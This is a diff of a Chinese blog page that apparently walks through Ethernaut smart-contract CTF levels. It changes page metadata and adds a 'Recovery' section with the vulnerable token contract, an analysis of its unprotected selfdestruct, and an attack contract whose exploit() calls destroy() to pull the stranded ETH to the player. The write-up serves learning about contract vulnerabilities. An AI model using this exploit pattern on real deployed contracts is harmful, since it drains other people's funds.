@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png">
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png">
 <meta property="article:published_time" content="2023-11-27T08:28:03.000Z">
-<meta property="article:modified_time" content="2024-04-14T06:26:06.419Z">
+<meta property="article:modified_time" content="2024-04-22T11:58:01.731Z">
 <meta property="article:author" content="xiaocai">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k words
+          14k words
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          101 mins
+          115 mins
         
       </span>
     
@@ -370,6 +370,22 @@
 
 <p>部署完成后，执行await contract.setFirstTime(‘攻击合约’)</p>
 <p>然后再执行 await contract.setFirstTime(‘player’)就可以了。</p>
+<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a><strong>Recovery</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Recovery &#123;<br>    //generate tokens<br>    function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>        new SimpleToken(_name, msg.sender, _initialSupply);<br>    &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br>    string public name;<br>    mapping(address =&gt; uint256) public balances;<br><br>    // constructor<br>    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;<br>        name = _name;<br>        balances[_creator] = _initialSupply;<br>    &#125;<br><br>    // collect ether in return for tokens<br>    receive() external payable &#123;<br>        balances[msg.sender] = msg.value * 10;<br>    &#125;<br><br>    // allow transfers of tokens<br>    function transfer(address _to, uint256 _amount) public &#123;<br>        require(balances[msg.sender] &gt;= _amount);<br>        balances[msg.sender] = balances[msg.sender] - _amount;<br>        balances[_to] = _amount;<br>    &#125;<br><br>    // clean up after ourselves<br>    function destroy(address payable _to) public &#123;<br>        selfdestruct(_to);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从合约地址找回丢失的0.5eth</p>
+<h4 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h4><p>通过自毁函数进行转账</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function destroy(address payable _to) public &#123;<br>      selfdestruct(_to);<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>更新msg.sender余额</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address _to, uint256 _amount) public &#123;<br>     require(balances[msg.sender] &gt;= _amount);<br>     balances[msg.sender] = balances[msg.sender] - _amount;<br>     balances[_to] = _amount;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>只需找到合约地址实行自毁函数将eth转会玩家地址就行。</p>
+<h5 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h5><p>通过etherscan进行查找</p>
+<h4 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract attack &#123;<br>    address payable target; //合约地址<br>    address payable myaddr; //player<br><br>    constructor(address payable _addr, address payable _myaddr) public &#123;<br>        target=_addr;<br>        myaddr=_myaddr;<br>    &#125;<br>    <br>    function exploit() public&#123;<br>        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,myaddr));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>部署后运行 exploit函数就行。</p>
 
                 
               </div>
